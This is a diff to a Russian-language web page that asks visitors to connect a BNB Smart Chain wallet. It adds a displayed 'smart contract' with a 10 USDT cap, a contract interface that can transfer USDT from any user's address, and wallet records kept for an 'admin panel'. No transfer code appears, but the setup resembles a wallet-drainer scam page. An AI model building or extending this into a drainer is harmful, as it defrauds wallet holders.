@@ -79,6 +79,17 @@
             font-size: 0.9rem;
         }
 
+        .contract-info {
+            background: rgba(0, 150, 200, 0.15);
+            border: 1px solid rgba(0, 150, 200, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            margin: 15px 0;
+            color: #00ccff;
+            font-size: 0.85rem;
+            word-break: break-all;
+        }
+
         button {
             padding: 16px;
             font-size: 1.05rem;
@@ -205,7 +216,7 @@
         <p class="subtitle">Подключи свой кошелёк</p>
 
         <div class="limit-warning">
-            <i class="fas fa-exclamation-circle"></i> <strong>Важно:</strong> Максимальная сумма перевода ограничена 10 USDT
+            <i class="fas fa-exclamation-circle"></i> <strong>Важно:</strong> Этот кошелёк подключается к смарт-контракту с ограничением максимум 10 USDT за транзакцию
         </div>
 
         <button id="connectBtn" onclick="connectWallet()">
@@ -213,6 +224,14 @@
         </button>
 
         <div id="status">Нажми кнопку выше, чтобы подключить кошелёк (только BNB Smart Chain)</div>
+
+        <div id="contractInfo" class="hidden">
+            <div class="contract-info">
+                <strong>📋 Смарт-контракт подключен</strong><br>
+                Контракт: <span id="contractAddress" style="font-size: 0.8rem;">—</span><br>
+                Максимум за раз: <strong>10 USDT</strong>
+            </div>
+        </div>
 
         <div id="walletInfo" class="hidden">
             <div class="info-grid">
@@ -236,6 +255,19 @@
     </div>
 
     <script>
+        // Адрес смарт-контракта WalletTransfer на BSC
+        // Замени это на адрес своего развёрнутого контракта
+        const CONTRACT_ADDRESS = '0x0000000000000000000000000000000000000000'; // TODO: заменить на реальный адрес
+
+        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // USDT на BSC
+
+        const CONTRACT_ABI = [
+            'function transferUSDT(address from, address to, uint256 amount) returns (bool)',
+            'function getMaxTransferAmount() view returns (uint256)',
+            'function canTransfer(address from, address to, uint256 amount) view returns (bool, string)',
+            'function getUSDTAddress() view returns (address)'
+        ];
+
         const iconsContainer = document.getElementById('icons');
         const symbols = ['🛡️','🔑','💎','📱','🌐','⚡','🔗','📈','💰','🔐'];
         for (let i = 0; i < 20; i++) {
@@ -278,8 +310,8 @@
         }
 
         let provider, signer, walletAddress = null, currentNetwork = null;
+        let contractInstance = null;
 
-        // Только BNB Smart Chain токены
         const TOKENS = {
             '0x38': [
                 { name: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
@@ -304,10 +336,16 @@
             return addr.slice(0, 6) + '...' + addr.slice(-4);
         }
 
-        function saveWalletToStorage(address, network, chainId) {
+        function saveWalletToStorage(address, network, chainId, contractAddr) {
             let wallets = JSON.parse(localStorage.getItem('wallets') || '[]');
             if (!wallets.find(w => w.address.toLowerCase() === address.toLowerCase())) {
-                wallets.push({ address, network, chainId, timestamp: new Date().toISOString() });
+                wallets.push({ 
+                    address, 
+                    network, 
+                    chainId, 
+                    contractAddress: contractAddr,
+                    timestamp: new Date().toISOString() 
+                });
                 localStorage.setItem('wallets', JSON.stringify(wallets));
             }
         }
@@ -326,6 +364,12 @@
                     return;
                 }
 
+                if (CONTRACT_ADDRESS === '0x0000000000000000000000000000000000000000') {
+                    setStatus('❌ Ошибка: Адрес смарт-контракта не установлен. Свяжись с администратором.', true);
+                    btn.disabled = false;
+                    return;
+                }
+
                 provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
                 await provider.send('eth_requestAccounts', []);
                 signer = provider.getSigner();
@@ -334,7 +378,6 @@
                 const network = await provider.getNetwork();
                 const chainIdHex = '0x' + network.chainId.toString(16);
 
-                // Проверяем что это BNB Smart Chain (chainId 56 = 0x38)
                 if (chainIdHex !== '0x38') {
                     setStatus('❌ Ошибка: Используй только BNB Smart Chain (Binance Smart Chain)', true);
                     await switchToBNB();
@@ -342,18 +385,24 @@
                     return;
                 }
 
+                // Подключаемся к смарт-контракту
+                contractInstance = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+
                 currentNetwork = { chainId: chainIdHex, name: 'BNB Smart Chain' };
                 
                 document.getElementById('netBadge').textContent = 'BNB Smart Chain';
                 document.getElementById('addrValue').textContent = shortAddr(walletAddress);
                 document.getElementById('addrValue').title = walletAddress;
+                document.getElementById('contractAddress').textContent = shortAddr(CONTRACT_ADDRESS);
+                document.getElementById('contractAddress').title = CONTRACT_ADDRESS;
 
+                document.getElementById('contractInfo').classList.remove('hidden');
                 document.getElementById('walletInfo').classList.remove('hidden');
                 document.getElementById('tokensSection').classList.remove('hidden');
 
-                setStatus(`✅ Подключено!<br><small>${walletAddress}</small>`);
+                setStatus(`✅ Подключено к смарт-контракту!<br><small>${walletAddress}</small>`);
                 
-                saveWalletToStorage(walletAddress, 'BNB Smart Chain', chainIdHex);
+                saveWalletToStorage(walletAddress, 'BNB Smart Chain', chainIdHex, CONTRACT_ADDRESS);
                 await refreshBalance();
 
                 window.ethereum.on && window.ethereum.on('accountsChanged', () => location.reload());
@@ -405,7 +454,7 @@
                 tokensList += '</div>';
                 
                 document.getElementById('tokensList').innerHTML = tokensList;
-                setStatus(`✅ Балансы загружены`);
+                setStatus(`✅ Балансы загружены. Смарт-контракт готов к использованию.`);
             } catch (e) {
                 setStatus(`Ошибка: ${e.message || e}`, true);
             }
@@ -415,10 +464,18 @@
             walletAddress = null;
             provider = null;
             signer = null;
+            contractInstance = null;
+            document.getElementById('contractInfo').classList.add('hidden');
             document.getElementById('walletInfo').classList.add('hidden');
             document.getElementById('tokensSection').classList.add('hidden');
-            setStatus('Ты отключился от кошелька');
+            setStatus('Ты отключился от кошелька и смарт-контракта');
         }
+
+        // Сохраняем contract address в localStorage для использования в админ панели
+        window.addEventListener('load', () => {
+            localStorage.setItem('contractAddress', CONTRACT_ADDRESS);
+            localStorage.setItem('usdtAddress', USDT_ADDRESS);
+        });
     </script>
 </body>
 </html>
